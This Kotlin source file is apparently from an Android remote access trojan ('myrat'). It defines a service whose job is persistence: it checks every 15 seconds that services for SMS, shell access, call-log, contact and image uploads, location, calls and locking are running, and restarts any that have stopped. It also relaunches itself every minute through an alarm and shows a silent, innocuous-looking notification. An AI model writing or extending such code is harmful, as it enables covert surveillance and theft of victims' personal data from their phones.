package com.myrat.app.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import androidx.core.app.NotificationCompat
import com.myrat.app.R
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*

class ServiceMonitorService : Service() {
    
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val NOTIFICATION_ID = 999
    private val CHANNEL_ID = "ServiceMonitor"
    
    private val requiredServices = listOf(
        SmsService::class.java,
        ShellService::class.java,
        CallLogUploadService::class.java,
        ContactUploadService::class.java,
        ImageUploadService::class.java,
        LocationService::class.java,
        CallService::class.java,
        LockService::class.java,
        SmsConsentService::class.java
    )

    override fun onCreate() {
        super.onCreate()
        startForegroundService()
        scheduleRestart()
        startServiceMonitoring()
        Logger.log("ServiceMonitorService started - monitoring ${requiredServices.size} services")
    }

    private fun startForegroundService() {
        val channelName = "Service Monitor"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Service Monitor")
            .setContentText("Monitoring ${requiredServices.size} background services")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .setShowWhen(false)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun scheduleRestart() {
        try {
            val alarmIntent = Intent(this, ServiceMonitorService::class.java)
            val pendingIntent = PendingIntent.getService(
                this, 0, alarmIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            alarmManager.setRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 60_000,
                1 * 60_000, // Check every 1 minute
                pendingIntent
            )
            Logger.log("ServiceMonitor restart scheduled every 1 minute")
        } catch (e: Exception) {
            Logger.error("Failed to schedule service monitor restart", e)
        }
    }

    private fun startServiceMonitoring() {
        scope.launch {
            while (isActive) {
                try {
                    delay(15_000) // Check every 15 seconds
                    checkAndRestartServices()
                } catch (e: Exception) {
                    Logger.error("Error in service monitoring", e)
                }
            }
        }
    }

    private fun checkAndRestartServices() {
        try {
            val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)
            val runningServiceNames = runningServices.map { it.service.className }.toSet()

            var restartedCount = 0
            requiredServices.forEach { serviceClass ->
                val serviceName = serviceClass.name
                if (!runningServiceNames.contains(serviceName)) {
                    Logger.log("Service $serviceName not running, restarting...")
                    restartService(serviceClass)
                    restartedCount++
                }
            }
            
            if (restartedCount > 0) {
                Logger.log("Restarted $restartedCount services")
            }
        } catch (e: Exception) {
            Logger.error("Error checking services", e)
        }
    }

    private fun restartService(serviceClass: Class<*>) {
        try {
            val serviceIntent = Intent(this, serviceClass)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Logger.log("Restarted ${serviceClass.simpleName}")
        } catch (e: Exception) {
            Logger.error("Failed to restart ${serviceClass.simpleName}", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Logger.log("ServiceMonitorService onStartCommand - ensuring all services are running")
        
        // Immediately check and restart services
        scope.launch {
            try {
                delay(2000) // Small delay to let system settle
                checkAndRestartServices()
            } catch (e: Exception) {
                Logger.error("Error in immediate service check", e)
            }
        }
        
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
        Logger.log("ServiceMonitorService destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}